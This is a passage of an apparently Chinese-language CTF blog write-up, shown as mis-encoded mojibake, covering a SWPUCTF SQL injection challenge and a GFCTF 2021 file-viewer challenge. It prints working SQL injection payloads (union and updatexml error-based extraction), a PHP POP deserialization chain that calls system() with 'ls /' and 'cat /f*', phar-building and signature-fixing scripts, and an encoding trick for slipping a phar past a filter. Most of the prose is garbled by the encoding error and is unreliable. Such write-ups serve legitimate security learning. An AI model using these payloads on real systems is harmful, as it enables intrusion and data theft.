·çš„è¯ï¼Œååºåˆ—åŒ–å…ˆè°ƒç”¨wakeupä¿®æ”¹äº†localå†…å®¹ï¼Œä½†åœ¨è„šæœ¬æ‰§è¡Œç»“æŸçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•°æ¥è¿›è¡Œå¤„ç†ï¼ˆGCå›æ”¶æœºåˆ¶ï¼‰è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬åˆä¼šé‡æ–°è°ƒç”¨FileViewerç±»å¯¹è±¡ä¸­çš„callé­”æœ¯æ–¹æ³•ï¼Œæ¥ç€è°ƒç”¨loadfile-ã€‹curlæ–¹æ³•ï¼Œå¯¼è‡´æœ€ç»ˆçš„flagå›æ˜¾ã€‚ å‚è€ƒæ–‡ç«  2022 SWPU NSS æ–°ç”Ÿèµ› Web Writeup [SWPUCTF 2022 æ–°ç”Ÿèµ›]Power! [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]æŸ¥æŸ¥need è¿™é“é¢˜ä¹Ÿæ˜¯è¢«æˆ‘æƒ¯æ€§æ€ç»´å¯¼è‡´åšä¸å‡ºæ¥å§ï¼Œè¿™é‡Œé¢˜ç›®æç¤ºè¯´æ˜¯å°è¯•ä¸‡èƒ½å¯†ç ã€‚é‚£æˆ‘ä»¬å°±éœ€è¦æ‰¾æ³¨å…¥ç‚¹ï¼Œè¿™é‡Œæ‰¾äº†åŠå¤©ä¹Ÿæ²¡æœ‰æ•ˆæœã€‚çœ‹äº†wpå‘ç°æ˜¯æ€è·¯å¤ªæ­»æ¿å§ï¼Œæˆ‘åªè¿›è¡Œäº†å•å¼•å·çš„å°è¯•ï¼Œæ²¡æƒ³åˆ°è¿™é‡Œæ˜¯å½“è¾“å…¥åŒå¼•å·ä¹‹åä¼šäº§ç”ŸæŠ¥é”™ã€‚å¯¼è‡´æˆ‘é”™è¿‡äº†æ³¨å…¥ç‚¹ã€‚ ä¸‡èƒ½å¯†ç  é¦–å…ˆæ˜¯ä¸€ä¸ªæˆç»©æŸ¥è¯¢ç³»ç»Ÿï¼Œè¿™é‡Œæ ¹æ®é©¬åç‚®æˆ‘ä»¬åœ¨postä¼ å‚å‡ºéƒ½æ·»åŠ åŒå¼•å·è¿›è¡Œå°è¯•ï¼Œå°±ä¼šå‘ç°ï¼Œå½“å­¦å·å¤„è¾“å…¥åŒå¼•å·å°±ä¼šå¼•å‘æŠ¥é”™ å¾ˆæ˜æ˜¾è¿™é‡Œå°±æ˜¯æ³¨å…¥ç‚¹äº†ï¼Œç»“åˆä¸‡èƒ½å¯†ç çš„æç¤ºï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯è¿™æ ·æ„é€ ï¼š222\" or \"1\"=\"1\"%23è¿™æ ·å°±èƒ½æ°¸çœŸäº†ï¼Œè€Œè¿™é‡Œçš„å§“åæˆ‘ä»¬éœ€è¦æ˜¯æ­£ç¡®çš„æ‰è¡Œï¼Œå¾ˆå¹¸è¿ï¼Œå§“åè¿™é‡Œå³ä¸Šè§’ç»™äº†æˆ‘ä»¬äº†ï¼Œåªéœ€è¦å†™ä¸ªè„šæœ¬æå–ä¸€ä¸‹ï¼ˆä¸ºäº†ä¸ä¹±ç æˆ‘æå–çš„æ—¶å€™urlç¼–ç äº†ï¼‰ import openpyxl from urllib.parse import quote def extract_student_names(file_path, output_file): workbook = openpyxl.load_workbook(file_path) sheet = workbook.active with open(output_file, 'w', encoding='utf-8') as f: for row in sheet.iter_rows(values_only=True): student_name = row[0] # å‡è®¾å­¦ç”Ÿå§“ååœ¨ç¬¬ä¸€åˆ— if student_name: student_name = quote(student_name) f.write(student_name + ' ') print('å­¦ç”Ÿå§“åæå–å®Œæˆï¼') # è°ƒç”¨ç¤ºä¾‹ xlsx_file = 'æ–‡ä»¶åœ°å€' # æ›¿æ¢ä¸ºæ‚¨çš„æ–‡ä»¶è·¯å¾„ output_txt = 'student_names.txt' # æ›¿æ¢ä¸ºè¾“å‡ºæ–‡ä»¶çš„è·¯å¾„ extract_student_names(xlsx_file, output_txt) æ•ˆæœå¦‚ä¸‹ï¼š æ¥ç€bpæŠ“åŒ…è¿›è¡Œçˆ†ç ´ï¼Œè€Œæƒ³åˆ°çˆ†ç ´çš„åŸå› åœ¨äºè¿™ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå‡ºæ¥çš„æ˜¯æˆç»©ï¼Œè€Œä¸æ˜¯ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯çŒœæµ‹ï¼Œå¦‚æœéƒ½çˆ†ç ´ä¸€éï¼Œä¸€å®šæœ‰ä¸€ä¸ªå­¦ç”Ÿçš„ç»“æœä¼šä¸ä¸€æ ·ã€‚ç»“æœä¹Ÿå‘Šè¯‰æˆ‘ï¼Œæˆ‘çš„æ€è·¯æ˜¯æ­£ç¡®çš„ çˆ†ç ´å®Œä¹‹åæŸ¥çœ‹é•¿åº¦ï¼Œå‘ç°æœ‰flagæ³„éœ²ã€‚ä½†äº‹åçœ‹äº†wpå‘ç°è¿˜å¯ä»¥ç”¨å¸¸è§„çš„è”åˆæ³¨å…¥å¾—åˆ°ï¼Œå¹¶ä¸”å…¶ä¸­çš„å§¿åŠ¿æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§åˆ°ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥ï¼‰è¿™é‡Œå°±å­¦ä¹ ä¸€ä¸‹è”åˆæ³¨å…¥äº† è”åˆæ³¨å…¥ é¦–å…ˆå¸¸è§„è”åˆæ³¨å…¥å‘ç°å­˜åœ¨5åˆ—æ•°æ®ï¼Œæ¥ä¸‹æ¥çš„è”åˆæ³¨å…¥å°±å‡ºé—®é¢˜äº† name=1&amp;password=1&amp;student_id=1\" union select 1,2,3,4,5--+ å¯ä»¥çœ‹åˆ°é¡µé¢å¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºå›æ˜¾ä½ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ²¡è§è¿‡è¿™ç§æƒ…å†µï¼Œçœ‹äº†å¸ˆå‚…è§£é‡Šæ˜¯è¿™æ ·çš„ é—®é¢˜æ¥äº†ï¼Œå½“æˆ‘æŒ‰æ­£å¸¸è”åˆæ³¨å…¥æµç¨‹æµ‹çš„æ—¶å€™å‘ç°å®ƒè¯´æŸ¥æ— æ­¤äººæˆ–å¯†ç é”™è¯¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„nameæ˜¯1ï¼Œè”åˆæ³¨å…¥æŸ¥åˆ°çš„æ•°æ®æ˜¯1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5 ä»å‰ç«¯æ˜¾ç¤ºçš„ç»“æœæ¥çœ‹å¾ˆæ˜¾ç„¶nameå¹¶ä¸æ˜¯ç¬¬ä¸€ä¸ªå­—æ®µï¼Œä¸æ–­æµ‹è¯•ï¼Œæµ‹å‡ºnameå­—æ®µä½ å½“æŠŠç¬¬äºŒä¸ªå­—æ®µè®¾ä¸º1çš„æ—¶å€™å°±åˆ¤æ–­æ­£ç¡®äº†ï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­—æ®µæ˜¯nameï¼Œç„¶åå›æ˜¾çš„æˆç»©æ˜¯5ï¼Œè¯´æ˜ç¬¬äº”ä¸ªå­—æ®µæ˜¯æˆç»© ç”±æ­¤å¯ä»¥åˆ¤æ–­åç«¯çš„å¤„ç†é€»è¾‘ ï¼ˆmysqlæŸ¥å®Œæ•°æ®åå–æŸ¥åˆ°æ•°æ®çš„nameå­—æ®µå€¼å’Œç”¨æˆ·è¾“å…¥çš„nameå€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœnameåˆ¤æ–­æˆåŠŸï¼Œç„¶åå›æ˜¾ è¿™é‡Œç”¨è”åˆæ³¨å…¥ä½¿æŸ¥åˆ°çš„nameå€¼ä¸º1ï¼Œæˆ‘ä»¬å‰ç«¯è¾“å…¥çš„nameå€¼ä¹Ÿæ˜¯1ï¼Œä¸¤è€…ç›¸ç­‰ï¼Œå°±åˆ¤æ–­æˆåŠŸäº†ï¼‰ è¿™é‡Œå¸¸è§„æŸ¥åº“ï¼Œå½“æŸ¥åˆ°è¡¨åçš„æ—¶å€™åˆå‡ºç°é—®é¢˜äº† æŠ¥é”™æ˜¾ç¤ºå­—ç¬¦é›†ä¸åŒ¹é…ï¼Œé‚£å°±è®©å®ƒåŒ¹é…ï¼Œcollate å­å¥å°†å­—ç¬¦é›†è½¬æ¢ä¸ºä¸€è‡´çš„å½¢å¼ï¼Œä¸€èˆ¬å­—ç¬¦é›†çš„è¯éƒ½æ˜¯utf8 name=1&amp;password=1&amp;student_id=1\" union select 1,1,3,4,group_concat(table_name)collate utf8_general_ci from information_schema.tables where table_schema=database()--+ å‘ç°æˆåŠŸï¼Œä¹‹åå°±æ˜¯å¸¸è§„æ€è·¯äº†ï¼Œä¸èµ˜è¿°äº† æŠ¥é”™æ³¨å…¥ name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(database()),0x7e),1)--+ name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='students'),0x7e),1)--+ åˆ°äº†è¿™é‡Œå°±ä¼šå°´å°¬æ‰ï¼Œå› ä¸ºæ‰¾äº†æ‰€æœ‰çš„åˆ—éƒ½æ²¡æœ‰flagï¼Œè¿™é‡Œçœ‹å¸ˆå‚…å¦‚ä½•è§£é‡Šçš„ åº”è¯¥æ˜¯æŸ¥åˆ°çš„æ•°æ®å¤ªå¤šäº†ï¼Œæ²¡æœ‰å…¨éƒ¨å›æ˜¾å‡ºæ¥ï¼Œç„¶åå›æ˜¾å‡ºæ¥çš„æ•°æ®ä¸­ä¹Ÿæ²¡æœ‰flagã€‚ å‡ºé¢˜äººåº”è¯¥æ˜¯æŠŠflagæ”¾åœ¨è¡¨çš„æœ€åäº†ï¼Œå†·é™ï¼Œå†·é™ï¼Œflagæ˜¯å¾ˆé•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æŸä¸€åˆ—æœ€å¤§çš„é‚£ä¸ªæ•°æ®å°±å¯ä»¥äº†ï¼Œè¿™é‡Œç”¨MAXå‡½æ•°è·å–æŒ‡å®šåˆ—ä¸­çš„æœ€å¤§å€¼ è¿™æ ·çš„è¯å°±å¯ä»¥è¿™æ ·æ„é€ ï¼Œè‡³äºå®Œæ•´å›æ˜¾ï¼Œç”¨midã€substréƒ½å¯ï¼Œä¸å†èµ˜è¿° name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select MAX(grade)from students),0x7e),1)--+ [GFCTF 2021]æ–‡ä»¶æŸ¥çœ‹å™¨ ç»™å‡ºä¸€ä¸ªç™»å½•é¡µé¢ï¼Œç›´æ¥å°è¯•å¼±å¯†ç admin:adminç™»å½•æˆåŠŸï¼Œä¹‹åæ˜¯ä¸€ä¸ªæ–‡ä»¶æŸ¥çœ‹å™¨ã€‚æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹ç›¸å…³æ–‡ä»¶ï¼Œå®¡è®¡ä»£ç  index.php &lt;?php function __autoload($className) { include(\"class/\".$className.\".class.php\"); } if(!isset($_GET['c'])){ header(\"location:./?c=User&amp;m=login\"); }else{ $c=$_GET['c']; $class=new $c(); if(isset($_GET['m'])){ $m=$_GET['m']; $class-&gt;$m(); } } å¼„äº†åŠå¤©ï¼Œæ‰«äº†ç›®å½•å‘ç°æºç éƒ½åœ¨www.zipä¸Šã€‚ã€‚ã€‚ Myerror.class.php &lt;?php class Myerror{ public $message; public function __construct(){ ini_set('error_log','/var/www/html/log/error.txt'); ini_set('log_errors',1); } public function __tostring(){ $test=$this-&gt;message-&gt;{$this-&gt;test}; return \"test\"; } } User.class.php &lt;?php error_reporting(0); class User{ public $username; public $password; public function login(){ include(\"view/login.html\"); if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){ $this-&gt;username=$_POST['username']; $this-&gt;password=$_POST['password']; if($this-&gt;check()){ header(\"location:./?c=Files&amp;m=read\"); } } } public function check(){ if($this-&gt;username===\"admin\" &amp;&amp; $this-&gt;password===\"admin\"){ return true; }else{ echo \"{$this-&gt;username}çš„å¯†ç ä¸æ­£ç¡®æˆ–ä¸å­˜åœ¨è¯¥ç”¨æˆ·\"; return false; } } public function __destruct(){ (@$this-&gt;password)(); } public function __call($name,$arg){ ($name)(); } } Files.class.php &lt;?php class Files{ public $filename; public function __construct(){ $this-&gt;log(); } public function read(){ include(\"view/file.html\"); if(isset($_POST['file'])){ $this-&gt;filename=$_POST['file']; }else{ die(\"è¯·è¾“å…¥æ–‡ä»¶å\"); } $contents=$this-&gt;getFile(); echo '&lt;br&gt;&lt;textarea class=\"file_content\" type=\"text\" value='.\"&lt;br&gt;\".$contents; } public function filter(){ if(preg_match('/^\\/|phar|flag|data|zip|utf16|utf-16|\\.\\.\\//i',$this-&gt;filename)){ echo \"è¿™åˆç†å—\"; throw new Error(\"è¿™ä¸åˆç†\"); } } public function getFile(){ $contents=file_get_contents($this-&gt;filename); $this-&gt;filter(); if(isset($_POST['write'])){ file_put_contents($this-&gt;filename,$contents); } if(!empty($contents)){ return $contents; }else{ die(\"è¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…å†…å®¹ä¸ºç©º\"); } } public function log(){ $log=new Myerror(); } public function __get($key){ ($key)($this-&gt;arg); } } é™¤äº†Fileè¿™ä¸ªç±»æ–‡ä»¶ï¼Œä¸Šè¿°å‡ ä¸ªå°±æ˜¯æ¥å¤„ç†é”™è¯¯å’Œç”¨æˆ·ç™»å½•çš„ UserClass.__destruct-ã€‹UserClass.check-ã€‹MyerrorClass.__toString-ã€‹FilesClass.__get è¿™é‡Œæˆ‘å…ˆç›´æ¥å†™å‡ºæœ€ç»ˆçš„é“¾å­ &lt;?php class Myerror{ public $message; public $test; } class User{ public $username; public $password; } class Files { public $filename; public function __get($key){ ($key)($this-&gt;arg); } } $pop = new User(); $pop1 = new User(); $pop-&gt;password = [$pop1, 'check']; $pop-&gt;username = new Myerror(); $pop-&gt;username-&gt;message = new Files(); $pop-&gt;username-&gt;test = 'system'; $pop-&gt;username-&gt;message-&gt;arg = 'ls /'; echo serialize($pop); ?&gt; ä¸è¿‡è¿™ä¸ªé“¾å­åœ¨è°ƒç”¨checkæ–¹æ³•çš„æ—¶å€™ä¼šé‡åˆ°ç‚¹é—®é¢˜ï¼š åœ¨PHPä¸­ï¼Œå½“ä½ åœ¨ç±»çš„ __destruct é­”æœ¯æ–¹æ³•ä¸­ä½¿ç”¨ check() çš„æ–¹å¼è¿›è¡Œè°ƒç”¨æ—¶ï¼Œå®ƒä¸ $this-&gt;check() çš„è°ƒç”¨æ–¹å¼å¹¶ä¸ç›¸åŒã€‚ check() çš„æ–¹å¼æ˜¯ä»¥å‡½æ•°çš„æ–¹å¼è¿›è¡Œè°ƒç”¨ï¼Œè€Œä¸æ˜¯ä½œä¸ºç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚è¿™æ„å‘³ç€å®ƒå°†è¢«è§†ä¸ºå…¨å±€å‡½æ•°ï¼Œè€Œä¸æ˜¯ç±»çš„æ–¹æ³•ã€‚è¿™ç§æ–¹å¼å¯èƒ½ä¼šå¯¼è‡´é”™è¯¯ï¼Œå› ä¸ºåœ¨ __destruct æ–¹æ³•ä¸­æ— æ³•ç›´æ¥è°ƒç”¨å…¨å±€å‡½æ•°ã€‚ å¦‚æœä½ æƒ³åœ¨ __destruct æ–¹æ³•ä¸­è°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œæ­£ç¡®çš„æ–¹å¼æ˜¯ä½¿ç”¨ $this-&gt;check()ã€‚è¿™å°†ç¡®ä¿åœ¨ç±»çš„ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ check() æ–¹æ³•ã€‚ ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢è¿™ä¸ªä»£ç ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥å°†passwordèµ‹å€¼ä¸ºcheckçš„è¯ï¼Œå°±æ˜¯è¿™æ ·çš„ï¼šcheck()ï¼Œè€Œè¿™ç§è°ƒç”¨æ–¹å¼ä¸$this-&gt;check()æ˜¯ä¸ç›¸åŒçš„ã€‚é‚£æˆ‘ä»¬æƒ³è¦è°ƒç”¨checkå‡½æ•°ï¼Œè¿™é‡Œå°±éœ€è¦åˆ©ç”¨PHPæŸä¸ªç‰¹æ€§äº† public function __destruct(){ (@$this-&gt;password)(); } è§£å†³åŠæ³•å°±æ˜¯åˆ©ç”¨PHP7å¼•å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§ Uniform Variable Syntax,å®ƒæ‰©å±•äº†å¯è°ƒç”¨æ•°ç»„çš„åŠŸèƒ½,å¢åŠ äº†å…¶åœ¨å˜é‡ä¸Šè°ƒç”¨å‡½æ•°çš„èƒ½åŠ›ï¼Œä½¿å¾—å¯ä»¥åœ¨ä¸€ä¸ªå˜é‡ï¼ˆæˆ–è¡¨è¾¾å¼ï¼‰åé¢åŠ ä¸Šæ‹¬å·ç›´æ¥è°ƒç”¨å‡½æ•°ã€‚ å¯è°ƒç”¨æ•°ç»„çš„æ„é€ æˆ‘ä»¬ç®€å•æµ‹è¯•ä¸‹ &lt;?php highlight_file(__FILE__); class A{ public function check(){ echo \"&lt;br&gt;check!!!\"; } } $a=[new A(),\"check\"]; $a(); åé¢åŸºæœ¬å°±ä¸ä¼šäº†ï¼Œéƒ½æ˜¯æ²¡è§è¿‡çš„çŸ¥è¯†ï¼Œé¦–å…ˆè¿™é‡Œæˆ‘ä»¬å…ˆç†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæˆ‘ä»¬é“¾å­å‡†å¤‡å¥½äº†ï¼Œå°±æ˜¯è¦æ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼Œå¾ˆæ˜æ˜¾æ²¡æœ‰unserializeï¼Œä½†æ˜¯æœ‰file_get_contentsï¼ŒåŒæ—¶è¿˜æœ‰æŸ¥çœ‹æ–‡ä»¶çš„åŠŸèƒ½ã€‚é‚£å¾ˆå®¹æ˜“è”æƒ³åˆ°pharååºåˆ—åŒ–ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹å‡è®¾æˆ‘ä»¬å¯ä»¥ä¸Šä¼ é“¾å­äº†ï¼Œä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜ é‚£æˆ‘ä»¬ä¸Šä¼ äº†é“¾å­ï¼Œè‚¯å®šéœ€è¦pharä¼ªåè®®å»è¯»å–ç›¸åº”çš„æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹ä»£ç æ‰§è¡Œé€»è¾‘ï¼Œè¿™é‡Œä¸Šä¼ ä¹‹åä¼šè°ƒç”¨åˆ°getFileå‡½æ•°ï¼Œè¯¥å‡½æ•°å«æœ‰filterä¼šå°†æˆ‘ä»¬çš„pharç­‰å…³é”®å­—è¿‡æ»¤æ‰ï¼Œé—¹æˆ‘ä»¬å°±å¾—æƒ³åŠæ³•ç»•è¿‡ã€‚ åŒæ—¶æ³¨æ„åˆ°filterçš„è¿‡æ»¤å‡½æ•°æ˜¯åœ¨file_get_contentsååºåˆ—åŒ–å…¥å£ç‚¹çš„åé¢ï¼Œè¿™å……åˆ†æš—ç¤ºæˆ‘ä»¬å¯ä»¥ç»•è¿‡ï¼ŒåŒæ—¶æ³¨æ„åˆ°Userç±»ä¸­å«æœ‰ææ„å‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥è”æƒ³åˆ°PHPçš„GCåƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æå‰è°ƒç”¨åˆ°ææ„å‡½æ•°ï¼Œé‚£å°±ä¼šå®Œå…¨æŒ‰ç…§æˆ‘ä»¬ç†æƒ³çš„é“¾å­è·¯çº¿èµ°ä¸‹å»ï¼Œå°±ä¸ä¼šè¢«filteræ‰€è¿‡æ»¤æ‰ã€‚è‡³äºå¦‚ä½•æå‰è°ƒç”¨å·²ç»å­¦è¿‡å¾ˆå¤šæ¬¡äº†ï¼Œå°±ä¸èµ˜è¿°äº†ï¼Œæ”¾å‡ ç¯‡å¥½çš„æ–‡ç« å‚è€ƒå³å¯ã€‚ O:4:\"User\":2:{s:8:\"username\";O:7:\"Myerror\":2:{s:7:\"message\";O:5:\"Files\":2:{s:8:\"filename\";N;s:3:\"arg\";s:4:\"ls /\";}s:4:\"test\";s:6:\"system\";}s:8:\"password\";a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";N;s:8:\"password\";N;}i:1;s:5:\"check\";}} æˆ‘ä»¬çš„é“¾å­è¾“å‡ºå¦‚ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹å¯¹è±¡æŒ‡é’ˆç´¢å¼•æ¥æå‰è°ƒç”¨åˆ°ææ„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ”¹ä¸ºä¸‹é¢çš„ï¼ˆi:0ï¼‰ O:4:\"User\":2:{s:8:\"username\";O:7:\"Myerror\":2:{s:7:\"message\";O:5:\"Files\":2:{s:8:\"filename\";N;s:3:\"arg\";s:4:\"ls /\";}s:4:\"test\";s:6:\"system\";}s:8:\"password\";a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";N;s:8:\"password\";N;}i:0;s:5:\"check\";}} ä½†æ˜¯æˆ‘ä»¬ç”Ÿæˆçš„pharæ–‡ä»¶ï¼Œå› æ­¤åœ¨ç»è¿‡010ä¿®æ”¹åè¿˜éœ€è¦é‡æ–°è®¡ç®—ç­¾åï¼Œå®Œæ•´popå¦‚ä¸‹ &lt;?php class Myerror{ public $message; public $test; } class User{ public $username; public $password; } class Files { public $filename; public function __get($key){ ($key)($this-&gt;arg); } } $pop = new User(); $pop1 = new User(); $pop-&gt;password = [$pop1, 'check']; $pop-&gt;username = new Myerror(); $pop-&gt;username-&gt;message = new Files(); $pop-&gt;username-&gt;test = 'system'; $pop-&gt;username-&gt;message-&gt;arg = 'cat /f*'; echo serialize($pop); $phar = new Phar(\"exp.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //è®¾ç½®stub $phar-&gt;setMetadata($pop); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; import urllib.parse from hashlib import sha1 with open('D:\\\\PphProject\\\\Scripts\\\\exp.phar', 'rb') as file: f = file.read() s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ® h = f[-8:] # è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯† newf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB) with open('newtest.phar', 'wb') as file: file.write(newf) # å†™å…¥æ–°æ–‡ä»¶ ç„¶åå°±æ˜¯å¦‚ä½•åˆ©ç”¨ä¼ªåè®®å’Œè¿‡æ»¤å™¨è¯»å–ï¼Œå› ä¸ºpharæ–‡ä»¶å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥å°†äºŒè¿›åˆ¶å¤åˆ¶ä¸Šå»æ ¹æœ¬è¯†åˆ«ä¸äº†ï¼Œå› æ­¤ä¼šæƒ³åˆ°ç”¨base64ç¼–ç å¤åˆ¶ä¸Šå»ã€‚ä½†å½“æˆ‘ä»¬ç®€å•æµ‹è¯•ä¸€ä¸‹ä¼šå‘ç°ï¼Œå¦‚æœå…ˆå‘é€base64ç¼–ç å†…å®¹ï¼Œæ¥ç€åˆ©ç”¨PHPä¼ªåè®®å¯¹å†…å®¹è¿›è¡Œè§£ç ä¼šå‘ç°è¿™æ ·çš„æŠ¥é”™ è‡³äºä¸ºä½•æˆ‘ä»¬æ˜¯è¦è¯»å–error.txtï¼Œå®Œå…¨å°±æ˜¯å› ä¸ºå½“æˆ‘ä»¬è¾“å…¥ä¸€äº›ä¸ç¬¦åˆä»£ç çš„å†…å®¹ï¼Œè¯¥å†…å®¹å°±ä¼šè¢«ä¼ å…¥error.txtï¼ˆæµ‹è¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼‰ ä¸Šè¿°çš„æŠ¥é”™æ˜¯å› ä¸ºè¯»å–çš„æ˜¯æ•´ä¸ªerror.txtæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å…¶ä»–éç¼–ç ä¿¡æ¯,è€ŒBase64ä¼šå°†æ‰€æœ‰æ•°å­—ï¼Œå­—æ¯/+=éƒ½è®¤ä¸ºæ˜¯éœ€è¦è§£ç çš„ï¼Œè€Œé‚£äº›å…¶ä»–åƒåœ¾æ•°æ®æ²¡æœ‰ç»è¿‡base64ç¼–ç ï¼Œç›´æ¥è§£ç è‚¯å®šä¼šæŠ¥é”™ã€‚å› æ­¤é è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬ä¼šæƒ³åˆ°æ€æ ·æ‰èƒ½å°†é™¤äº†æˆ‘ä»¬payloadä¹‹å¤–çš„å†…å®¹éƒ½ææˆä¹±ç ï¼ˆbase64è¯†åˆ«ä¸äº†çš„ï¼‰è¿™æ ·è§£ç çš„æ—¶å€™ï¼Œå°±ä¼šåªè§£ç æˆ‘ä»¬çš„payloadè€Œä¸ä¼šæŠ¥é”™ã€‚ è¿™é‡Œå°±éœ€è¦æ–°çŸ¥è¯†äº† utf-16leç¼–ç  å½“utf-8è½¬æ¢ä¸ºutf-16leæ—¶ï¼Œæ¯ä¸€ä½å­—ç¬¦åé¢éƒ½ä¼šåŠ ä¸Šä¸€ä¸ª\\0ï¼Œè¿™ä¸ª\\0æ˜¯ä¸å¯è§çš„ï¼Œå½“å°†utf-16leè½¬æ¢ä¸ºutf-8çš„æ—¶å€™ï¼Œåªæœ‰åé¢æœ‰\\0çš„æ‰ä¼šè¢«æ­£å¸¸è½¬æ¢ï¼Œå¦åˆ™å˜ä¸ºä¹±ç  é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨utf-16leæ¥æ ‡è®°æˆ‘ä»¬çš„payloadï¼Œç„¶åè§£ç åªå¯¹æˆ‘ä»¬payloadè§£ç (å…¶ä»–å˜æˆä¹±ç )ï¼Œç„¶åå†base64è§£ç ã€‚ä¸è¿‡è¿™ä¸ªè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨UCS-2ç¼–ç ï¼ˆåŒºåˆ«åœ¨äº\\0åœ¨å‰é¢ï¼‰ UCS-2ç¼–ç  UCS-2 ç¼–ç ä½¿ç”¨å›ºå®š2ä¸ªå­—èŠ‚,æ‰€ä»¥åœ¨ASCIIå­—ç¬¦ä¸­,åœ¨æ¯ä¸ªå­—ç¬¦å‰é¢ä¼šå¡«å……ä¸€ä¸ª 00å­—èŠ‚(å¤§ç«¯åº) lanb0 =&gt; \\x00l\\x00a\\x00n\\x00b\\x000 é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯å¦‚ä½•æ„é€ \\0ï¼Œå› ä¸ºæ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥å¼•å…¥Quoted-Printableç¼–ç  â€œQuoted-Printable\"ç¼–ç çš„åŸºæœ¬åŸåˆ™æ˜¯ï¼šå®‰å…¨çš„ASCIIå­—ç¬¦ï¼ˆå¦‚å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ç­‰ï¼‰ä¿æŒä¸å˜ï¼Œç©ºæ ¼ä¹Ÿä¿æŒä¸å˜ï¼ˆä½†è¡Œå°¾çš„ç©ºæ ¼å¿…é¡»ç¼–ç ï¼‰ï¼Œå…¶ä»–æ‰€æœ‰å­—ç¬¦ï¼ˆå¦‚éASCIIå­—ç¬¦æˆ–æ§åˆ¶å­—ç¬¦ï¼‰åˆ™ä»¥â€=\"åè·Ÿä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—çš„å½¢å¼ç¼–ç  lanb0 =&gt; lanb0=0A è¿™æ ·çš„è¯ï¼Œæ•´ä¸ªæµç¨‹å¦‚ä¸‹ï¼š æµ‹è¯•æ•°æ®ï¼štest base64ç¼–ç ï¼šdGVzdA== åŠ ä¸Š\\0ï¼ˆç­‰å·ä¹Ÿè¦è½¬æ¢ï¼‰ï¼š=00d=00G=00V=00z=00d=00A=00=3D=00=3D ä¸Šä¼ åï¼š åƒåœ¾æ•°æ®=00d=00G=00V=00z=00d=00A=00=3D=00=3Dåƒåœ¾æ•°æ® è§£ç ï¼š åƒåœ¾æ•°æ®\\0d \\0G \\0V \\0z \\0d \\0A \\0= \\0=åƒåœ¾æ•°æ® UCS-2è½¬UTF-8ï¼šä¹±ç dGVzdA==ä¹±ç  base64è§£ç ï¼štest åŠ å¯†è„šæœ¬ &lt;?php $a=file_get_contents('newtest.phar');//è·å–äºŒè¿›åˆ¶æ•°æ® $a=iconv('utf-8','UCS-2',base64_encode($a));//UCS-2ç¼–ç  